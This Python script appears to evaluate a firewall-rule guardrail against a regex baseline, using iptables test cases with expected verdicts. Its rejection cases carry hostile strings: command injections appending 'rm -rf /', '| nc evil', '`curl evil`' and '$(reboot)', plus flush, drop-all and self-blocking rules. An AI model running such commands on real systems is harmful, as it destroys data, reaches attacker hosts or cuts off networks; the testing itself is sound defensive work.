"""Adversarial guardrail evaluation: HRT's deterministic gate vs a regex-only validator.

Each case is a candidate rule with the verdict a correct verifier should return. We report where
the regex baseline diverges from ground truth (its dangerous false accepts, mostly).
"""

from __future__ import annotations

from dataclasses import dataclass

from hrt.config import Settings
from hrt.guardrail.pipeline import Guardrail, regex_validate
from hrt.guardrail.sandbox import KernelSandbox


@dataclass
class Case:
    name: str
    rule: str
    should_pass: bool
    source: str                 # the alert's true source IP
    category: str


ATTACKER = "203.0.113.9"
INTERNAL_ATTACKER = "10.10.0.66"  # a compromised internal host (not a protected asset)
CASES: list[Case] = [
    # legitimate mitigations that must pass
    Case("block_attacker_insert", f"iptables -I INPUT 1 -s {ATTACKER} -j DROP", True, ATTACKER, "valid"),
    Case("block_attacker_reject", f"iptables -I INPUT 1 -s {ATTACKER} -p tcp --dport 22 -j REJECT", True, ATTACKER, "valid"),
    Case("block_attacker_host32", f"iptables -I INPUT 1 -s {ATTACKER}/32 -j DROP", True, ATTACKER, "valid"),
    # containment of a compromised internal host is allowed (it is not a protected asset)
    Case("contain_internal_host", f"iptables -I INPUT 1 -s {INTERNAL_ATTACKER} -j DROP", True, INTERNAL_ATTACKER, "valid"),
    # shell / command injection
    Case("inject_semicolon", f"iptables -I INPUT 1 -s {ATTACKER} -j DROP; rm -rf /", False, ATTACKER, "injection"),
    Case("inject_pipe", f"iptables -I INPUT 1 -s {ATTACKER} -j DROP | nc evil 1", False, ATTACKER, "injection"),
    Case("inject_backtick", f"iptables -I INPUT 1 -s {ATTACKER} -j DROP `curl evil`", False, ATTACKER, "injection"),
    Case("inject_subshell", f"iptables -I INPUT 1 -s {ATTACKER} -j DROP $(reboot)", False, ATTACKER, "injection"),
    Case("inject_amp", f"iptables -I INPUT 1 -s {ATTACKER} -j DROP && iptables -F", False, ATTACKER, "injection"),
    # self-inflicted DoS: protected assets / over-broad ranges
    Case("block_internal_lan", "iptables -I INPUT 1 -s 10.10.0.0/24 -j DROP", False, ATTACKER, "self_dos"),
    Case("block_server", "iptables -I INPUT 1 -s 10.10.0.10 -j DROP", False, ATTACKER, "self_dos"),
    Case("block_gateway", "iptables -I INPUT 1 -s 10.10.0.1 -j DROP", False, ATTACKER, "self_dos"),
    Case("block_known_good_client", "iptables -I INPUT 1 -s 10.10.0.50 -j DROP", False, ATTACKER, "self_dos"),
    Case("block_all", "iptables -I INPUT 1 -s 0.0.0.0/0 -j DROP", False, ATTACKER, "self_dos"),
    Case("block_broad_prefix", "iptables -I INPUT 1 -s 203.0.0.0/8 -j DROP", False, ATTACKER, "self_dos"),
    Case("block_loopback", "iptables -I INPUT 1 -s 127.0.0.1 -j DROP", False, ATTACKER, "self_dos"),
    # destructive / policy operations
    Case("flush", "iptables -F", False, ATTACKER, "destructive"),
    Case("policy_drop_all", "iptables -P INPUT DROP", False, ATTACKER, "destructive"),
    Case("delete_chain", "iptables -X", False, ATTACKER, "destructive"),
    Case("accept_target", f"iptables -I INPUT 1 -s {ATTACKER} -j ACCEPT", False, ATTACKER, "destructive"),
    Case("nat_table", f"iptables -t nat -I PREROUTING 1 -s {ATTACKER} -j DROP", False, ATTACKER, "destructive"),
    # wrong / unscoped target
    Case("wrong_ip", "iptables -I INPUT 1 -s 8.8.8.8 -j DROP", False, ATTACKER, "wrong_target"),
    Case("no_source", "iptables -I INPUT 1 -j DROP", False, ATTACKER, "wrong_target"),
    # semantically invalid but regex-shaped
    Case("bad_octet", "iptables -I INPUT 1 -s 999.1.1.1 -j DROP", False, ATTACKER, "invalid_syntax"),
    Case("bad_flag", f"iptables -I INPUT 1 -s {ATTACKER} --badflag -j DROP", False, ATTACKER, "invalid_syntax"),
    Case("bad_chain", f"iptables -I NONEXISTENT 1 -s {ATTACKER} -j DROP", False, ATTACKER, "invalid_syntax"),
    Case("negation", f"iptables -I INPUT 1 ! -s {ATTACKER} -j DROP", False, ATTACKER, "invalid_syntax"),
    Case("bad_port_range", f"iptables -I INPUT 1 -s {ATTACKER} -p tcp --dport 80:70 -j DROP", False, ATTACKER, "invalid_syntax"),
]


def run(settings: Settings, fast: bool = False) -> dict:
    sandbox = KernelSandbox(settings)
    sandbox_ok = sandbox.available()
    guardrail = Guardrail(settings, sandbox if sandbox_ok else None, lambda: [])

    rows, hrt_correct, regex_correct = [], 0, 0
    regex_false_accepts, hrt_stage = [], {}
    per_cat: dict[str, dict] = {}
    for c in CASES:
        verdict = guardrail.check(c.rule, c.source)
        hrt_pass = verdict.passed
        regex_pass = regex_validate(c.rule)
        # kernel-only invalid-syntax cases can't be judged correct without a sandbox
        skip_hrt = (not sandbox_ok) and c.category in ("invalid_syntax",) and c.should_pass is False and (
            verdict.failure and verdict.failure.stage == "kernel")
        hrt_ok = (hrt_pass == c.should_pass)
        if not skip_hrt:
            hrt_correct += hrt_ok
        regic_ok = (regex_pass == c.should_pass)
        regex_correct += regic_ok
        if regex_pass and not c.should_pass:
            regex_false_accepts.append(c.name)
        stage = verdict.failure.stage if verdict.failure else "passed"
        hrt_stage[c.name] = stage
        cat = per_cat.setdefault(c.category, {"n": 0, "hrt_correct": 0, "regex_correct": 0})
        cat["n"] += 1
        cat["hrt_correct"] += hrt_ok
        cat["regex_correct"] += regic_ok
        rows.append({"name": c.name, "category": c.category, "should_pass": c.should_pass,
                     "hrt_pass": hrt_pass, "hrt_stage": stage, "regex_pass": regex_pass})

    n = len(CASES)
    return {
        "sandbox_available": sandbox_ok,
        "n_cases": n,
        "hrt_accuracy": round(hrt_correct / n, 4),
        "regex_accuracy": round(regex_correct / n, 4),
        "regex_false_accepts": regex_false_accepts,
        "regex_false_accept_count": len(regex_false_accepts),
        "by_category": per_cat,
        "cases": rows,
    }
